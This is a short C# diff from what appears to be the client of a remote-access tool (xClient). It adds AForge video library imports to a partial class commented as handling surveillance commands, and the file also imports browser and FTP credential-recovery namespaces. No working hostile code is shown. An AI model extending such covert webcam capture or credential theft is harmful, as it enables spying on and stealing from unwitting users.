@@ -12,7 +12,8 @@ using System.Collections.Generic;
 using xClient.Core.Data;
 using xClient.Core.Recovery.Browsers;
 using xClient.Core.Recovery.FtpClients;
-
+using AForge.Video.DirectShow;
+using AForge.Video;
 namespace xClient.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE SURVEILLANCE COMMANDS. */
